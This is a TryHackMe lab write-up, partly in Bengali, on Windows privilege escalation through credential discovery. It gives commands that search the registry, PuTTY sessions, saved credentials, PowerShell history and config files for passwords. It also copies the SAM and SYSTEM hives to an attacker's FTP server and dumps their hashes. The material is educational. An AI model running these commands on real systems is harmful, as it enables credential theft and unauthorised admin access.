# Windows Privilege Escalation via Credential Discovery | Real-World Technique

# TryHackMe

```jsx
https://tryhackme.com/room/windows10privesc
```

## Taking RDP

```jsx
xfreerdp3 /u:user /p:password321 /cert:ignore /v:10.145.144.85 /dynamic-resolution
```

```jsx
reg query HKLM /f password /t REG_SZ /s 
```

```jsx
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

![image.png](Windows%20Privilege%20Escalation%20via%20Credential%20Discov/image.png)

Putty Path

```jsx
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions

```

```jsx
C:\Users\user>reg  query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42

```

![image.png](Windows%20Privilege%20Escalation%20via%20Credential%20Discov/image%201.png)

## From Stored Credential

### Windows Credential Manager

```jsx
cmdkey /add:example.com /user:jubair /password:pass
```

**Lets List**

```jsx
cmdkey /list
```

![image.png](Windows%20Privilege%20Escalation%20via%20Credential%20Discov/image%202.png)

```jsx
C:\Users\user>runas /savecred /user:admin cmd.exe
Attempting to start cmd.exe as user "WIN-QBA94KB3IOF\admin" ...
```

![image.png](Windows%20Privilege%20Escalation%20via%20Credential%20Discov/image%203.png)

**cmd.exe = reverse.exe**

## From SAM

**CD TO REPAIR**

![image.png](Windows%20Privilege%20Escalation%20via%20Credential%20Discov/image%204.png)

**SAM is not  in plain text; it's encrypted, so for decryption you need a key, which is in the SYSTEM Folder**

# Transfer with FTP

**We are going to transfer files from the Windows system to the attacking machine**

```jsx
sudo apt update && sudo apt install python3-pyftpdlib -y

┌──(kali㉿kali)-[~]
└─$ python3 -m pyftpdlib --write --port 21

```

![image.png](Windows%20Privilege%20Escalation%20via%20Credential%20Discov/image%205.png)

```jsx
ftp 192.168.128.41
annonymus
enter
```

![image.png](Windows%20Privilege%20Escalation%20via%20Credential%20Discov/image%206.png)

```jsx
binary
put SAM
put SYSTEM 
```

![image.png](Windows%20Privilege%20Escalation%20via%20Credential%20Discov/image%207.png)

![image.png](Windows%20Privilege%20Escalation%20via%20Credential%20Discov/image%208.png)

**Let's decrypt**  

```jsx
impacket-secreatdump LOCAL -system SYSTEM -sam -SAM
```

![image.png](Windows%20Privilege%20Escalation%20via%20Credential%20Discov/image%209.png)

# Another Technique( New Room)

```jsx
https://tryhackme.com/room/windowsprivesc20
```

RDP WITH Remmina

```jsx
xfreerdp3 /u:thm-unpriv /p:password321 /cert:ignore /v:10.145.137.185 /dynamic-resolution

```

HIstory from Powershell

```jsx
type C:\Users\thm-unpriv\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

```

![image.png](Windows%20Privilege%20Escalation%20via%20Credential%20Discov/image%2010.png)

## **Configuration Files Audit**

উইন্ডোজের আনঅ্যাটেন্ডেড ইনস্টলেশন ফাইলগুলো (`Unattend.xml` বা `Unattended.xml`) সিস্টেম কনফিগারেশনের সময় তৈরি হয় এবং প্রায়শই এর ভেতরে অ্যাডমিনিস্ট্রেটরের পাসওয়ার্ড বেস-৬৪ (`Base64`) বা প্লেইন টেক্সট হিসেবে সেভ থাকে।

```jsx
type C:\Windows\Panther\Unattended.xml
type C:\Windows\Sysprep\Unattend.xml
type C:\Windows\Sysprep\Unattended.xml
type C:\Windows\System32\Sysprep\unattend.xml

```

## Automatic Search

```jsx
dir /b /s C:\*Unattend*.xml

```

উইন্ডোজ ডটনেট ফ্রেমওয়ার্কের মূল `web.config` বা `machine.config` ফাইলগুলো অডিট করার উদ্দেশ্য হলো গ্লোবাল কনফিগারেশনে কোনো ডেটাবেস কানেকশন স্ট্রিং (`connectionStrings`), হার্ডকোডেড অ্যাপ্লিকেশন ক্রেডেনশিয়াল, অথবা কাস্টম সার্ভিস অ্যাকাউন্ট পাসওয়ার্ড সেভ করা আছে কি না তা দেখা।

```jsx
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

```

র্দিষ্ট করে পাসওয়ার্ড বা কানেকশন স্ট্রিং ফিল্টার করতে **`findstr`**

```jsx
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr /i "password connectionString user id"

```

উইন্ডোজ IIS (Internet Information Services) এর মূল কনফিগারেশন

```jsx
type C:\Windows\System32\inetsrv\config\applicationHost.config | findstr /i "password username"

```